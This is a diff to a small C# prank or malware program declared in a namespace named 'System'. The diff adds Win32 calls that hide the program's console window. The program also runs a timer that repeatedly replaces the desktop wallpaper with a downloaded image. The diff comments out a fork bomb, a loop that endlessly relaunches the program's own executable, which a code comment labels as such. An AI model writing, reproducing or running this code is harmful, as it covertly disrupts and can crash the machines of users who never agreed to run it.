@@ -13,6 +13,7 @@ using System.Media;
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+using System.Runtime.InteropServices;
 
 namespace System
 {
@@ -26,6 +27,15 @@ namespace System
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
 
         public enum Style
         {
@@ -47,9 +57,15 @@ namespace System
             // and every 10 seconds thereafter.
             Console.WriteLine("{0:h:mm:ss.fff} Creating timer.\n",
                 DateTime.Now);
+            var handle = GetConsoleWindow();
 
+            // Hide
+            ShowWindow(handle, SW_HIDE);
+
+            // Show
+ 
             var stateTimer = new Timer(statusChecker.CheckStatus,
-                autoEvent, 5000, 10000 * 60);
+                autoEvent, 5000, 10000*60);
 
             //**Uncomment the below if you want to re invoke the callback but REMEMBER to comment the code 
             //**for the fork bomb or else the rabbit from of mice and men will haunt u forever - RIP 1k37.
@@ -140,13 +156,13 @@ namespace System
                 Program.Set(new Uri("https://i.amz.mshcdn.com/xiXB9wCMR18CFrURMXFvDXvx0o4=/950x534/filters:quality(90)/https%3A%2F%2Fblueprint-api-production.s3.amazonaws.com%2Fuploads%2Fcard%2Fimage%2F751018%2Ff136d1e5-35db-4a62-8d1d-002abac70177.jpg"),Program.Style.Fill);
             }
 
-            if (invokeCount == 4)
-            {
-                while (true)
-                {
-                    Process.Start(Assembly.GetExecutingAssembly().Location);
-                }
-            }
+            //if (invokeCount == 4)
+            //{
+            //    while (true)
+            //    {
+            //        Process.Start(Assembly.GetExecutingAssembly().Location);
+            //    }
+            //}
 
             //this would never get hit.
             if (invokeCount == maxCount)
